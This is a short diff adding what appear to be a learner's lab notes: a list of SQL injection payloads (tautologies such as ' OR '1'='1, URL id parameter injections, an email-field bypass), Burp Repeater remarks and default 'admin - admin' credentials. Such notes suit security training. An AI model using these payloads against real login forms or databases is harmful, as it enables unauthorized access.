@@ -1,0 +1,23 @@
+" or 1=1 # - lab 1 payload
+
+?id=1' or '1'='1 +
+
+?id=1' or '1'='1++
+
+1' || '1'= '1
+
+?id=1 and 1=1
+
+admin@gmail.com") OR ('')=('')#
+
+' OR '1'='1
+
+" AND 1=1 # (burp - repeater)
+
+?id=1' or '1'='1 + (burp - repeater)
+
+admin - admin
+
+?id=1
+
+?id=4
